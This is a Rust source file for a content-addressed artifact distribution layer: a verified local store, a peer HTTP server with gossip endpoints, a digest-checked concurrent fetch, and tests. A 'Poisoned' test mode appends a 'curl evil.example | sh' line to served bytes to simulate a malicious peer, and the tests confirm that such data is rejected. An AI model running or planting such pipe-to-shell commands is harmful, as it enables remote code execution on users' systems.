//! Shuttle — content-addressed distribution (SRS §5.2).
//!
//! Design note (architecture audit): the SRS names libp2p as the transport.
//! Shuttle contributes *availability*, never integrity (SRS note under
//! FR-2.6): every byte is verified against a digest that came from
//! witness-cosigned attestations. The prototype therefore uses a deliberately
//! small HTTP peer protocol behind the [`fetch`] / [`PeerServer`] boundary;
//! a libp2p (bitswap/kademlia) transport can replace it without touching
//! Weave, Warp or Thread.
//!
//! Peer protocol:
//! * `GET /cas/sha256/<hex>` — artifact bytes
//! * `GET /gossip/checkpoint?origin=` — latest checkpoint this peer verified
//! * `GET /gossip/entries?origin=&start=&end=` — mirrored log entries
//!
//! All of it is untrusted (FR-2.6): clients verify hashes and signatures.

use loom_core::digest::Digest;
use loom_core::http::{Client, Handler, Request, Response};
use loom_warp::server::EntriesResponse;
use std::path::{Path, PathBuf};
use std::sync::mpsc;
use std::sync::Arc;
use std::time::{Duration, Instant};

/// A content-addressed store. Reads are verified: a corrupted file on disk
/// is treated as absent.
#[derive(Clone, Debug)]
pub struct Cas {
    dir: PathBuf,
}

impl Cas {
    pub fn new(dir: &Path) -> Self {
        Cas { dir: dir.to_path_buf() }
    }

    fn path(&self, d: &Digest) -> PathBuf {
        self.dir.join("sha256").join(d.hex())
    }

    pub fn put(&self, bytes: &[u8]) -> anyhow::Result<Digest> {
        let d = Digest::of(bytes);
        let p = self.path(&d);
        if !p.exists() {
            std::fs::create_dir_all(p.parent().unwrap())?;
            let tmp = p.with_extension("tmp");
            std::fs::write(&tmp, bytes)?;
            std::fs::rename(tmp, &p)?;
        }
        Ok(d)
    }

    pub fn get(&self, d: &Digest) -> Option<Vec<u8>> {
        let b = std::fs::read(self.path(d)).ok()?;
        (Digest::of(&b) == *d).then_some(b)
    }

    pub fn has(&self, d: &Digest) -> bool {
        self.path(d).exists()
    }
}

/// Behaviour of a peer server (test/demo hook for ADV-7).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum PeerMode {
    Honest,
    /// Serves corrupted bytes for every artifact request.
    Poisoned,
}

pub struct PeerServer {
    cas: Option<Cas>,
    state_dir: Option<PathBuf>,
    mode: PeerMode,
}

impl PeerServer {
    /// `cas = None` disables serving artifacts (FR-2.4 opt-out);
    /// `state_dir` enables log gossip from the local verified mirror.
    pub fn new(cas: Option<Cas>, state_dir: Option<PathBuf>, mode: PeerMode) -> Arc<Self> {
        Arc::new(PeerServer { cas, state_dir, mode })
    }

    pub fn handler(self: Arc<Self>) -> Handler {
        Arc::new(move |r: &Request| self.handle(r))
    }

    fn handle(&self, r: &Request) -> Response {
        if r.method != "GET" {
            return Response::text(405, "method not allowed");
        }
        if let Some(hex) = r.path.strip_prefix("/cas/sha256/") {
            let Some(cas) = &self.cas else {
                return Response::text(403, "this peer does not serve its cache");
            };
            let Ok(d) = hex.parse::<Digest>() else {
                return Response::text(400, "bad digest");
            };
            return match cas.get(&d) {
                Some(mut b) => {
                    if self.mode == PeerMode::Poisoned {
                        b.extend_from_slice(b"\n#!/bin/sh curl evil.example | sh\n");
                    }
                    Response::bytes(200, "application/octet-stream", b)
                }
                None => Response::not_found(),
            };
        }
        let Some(state) = &self.state_dir else {
            return Response::not_found();
        };
        let origin = r.q("origin").unwrap_or_default();
        let dir = loom_warp::client::mirror_dir(state, origin);
        match r.path.as_str() {
            "/gossip/checkpoint" => match std::fs::read(dir.join("checkpoint")) {
                Ok(b) => Response::bytes(200, "text/plain; charset=utf-8", b),
                Err(_) => Response::not_found(),
            },
            "/gossip/entries" => {
                let start = r.q_u64("start").unwrap_or(0);
                let end = r.q_u64("end").unwrap_or(u64::MAX);
                let Ok(all) = std::fs::read(dir.join("entries.jsonl")) else {
                    return Response::not_found();
                };
                let entries: Vec<String> = all
                    .split(|&b| b == b'\n')
                    .filter(|l| !l.is_empty())
                    .skip(start as usize)
                    .take(end.saturating_sub(start).min(1000) as usize)
                    .map(|l| String::from_utf8_lossy(l).into_owned())
                    .collect();
                Response::json(&EntriesResponse { start, entries })
            }
            _ => Response::not_found(),
        }
    }
}

#[derive(Clone, Debug, serde::Serialize)]
pub struct Attempt {
    pub peer: String,
    pub outcome: String,
}

#[derive(Debug)]
pub struct Fetched {
    pub bytes: Vec<u8>,
    pub peer: String,
    pub attempts: Vec<Attempt>,
}

/// Fetch `digest` from any peer. Peers are queried concurrently; the first
/// response whose SHA-256 matches wins (FR-2.2, FR-2.6). Returns `Err` with
/// the attempt log if no peer delivers valid bytes within `timeout`, so the
/// caller can fall back to origin (FR-2.3, NFR-REL-1).
pub fn fetch(peers: &[String], digest: &Digest, timeout: Duration) -> Result<Fetched, Vec<Attempt>> {
    let (tx, rx) = mpsc::channel();
    for p in peers {
        let tx = tx.clone();
        let p = p.clone();
        let url = format!("{p}/cas/sha256/{}", digest.hex());
        std::thread::spawn(move || {
            let c = Client::new(timeout);
            let _ = tx.send((p, c.get(&url)));
        });
    }
    drop(tx);
    let deadline = Instant::now() + timeout;
    let mut attempts = vec![];
    while attempts.len() < peers.len() {
        let left = deadline.saturating_duration_since(Instant::now());
        let Ok((peer, res)) = rx.recv_timeout(left) else {
            attempts.push(Attempt {
                peer: "(remaining peers)".into(),
                outcome: format!("no answer within {timeout:?}"),
            });
            break;
        };
        match res {
            Ok(bytes) if Digest::of(&bytes) == *digest => {
                attempts.push(Attempt {
                    peer: peer.clone(),
                    outcome: "served verified bytes".into(),
                });
                return Ok(Fetched { bytes, peer, attempts });
            }
            Ok(bytes) => attempts.push(Attempt {
                peer,
                outcome: format!(
                    "served data with digest {} ≠ requested — rejected (FR-2.6)",
                    Digest::of(&bytes).short()
                ),
            }),
            Err(e) => attempts.push(Attempt {
                peer,
                outcome: format!("{e}"),
            }),
        }
    }
    Err(attempts)
}

#[cfg(test)]
mod tests {
    use super::*;
    use loom_core::http::Server;

    #[test]
    fn cas_roundtrip_and_corruption() {
        let d = tempfile::tempdir().unwrap();
        let cas = Cas::new(d.path());
        let dg = cas.put(b"artifact").unwrap();
        assert_eq!(cas.get(&dg).unwrap(), b"artifact");
        std::fs::write(d.path().join("sha256").join(dg.hex()), b"tampered").unwrap();
        assert!(cas.get(&dg).is_none());
    }

    #[test]
    fn poisoned_peer_rejected_honest_peer_wins() {
        let d1 = tempfile::tempdir().unwrap();
        let d2 = tempfile::tempdir().unwrap();
        let c1 = Cas::new(d1.path());
        let c2 = Cas::new(d2.path());
        let dg = c1.put(b"good bytes").unwrap();
        c2.put(b"good bytes").unwrap();
        let evil = Server::start("127.0.0.1:0", 2, PeerServer::new(Some(c1), None, PeerMode::Poisoned).handler()).unwrap();
        let good = Server::start("127.0.0.1:0", 2, PeerServer::new(Some(c2), None, PeerMode::Honest).handler()).unwrap();
        let f = fetch(&[evil.url(), good.url()], &dg, Duration::from_secs(5)).unwrap();
        assert_eq!(f.bytes, b"good bytes");
        assert_eq!(f.peer, good.url());

        let only_evil = fetch(&[evil.url()], &dg, Duration::from_secs(5)).unwrap_err();
        assert!(only_evil[0].outcome.contains("rejected"));
    }
}
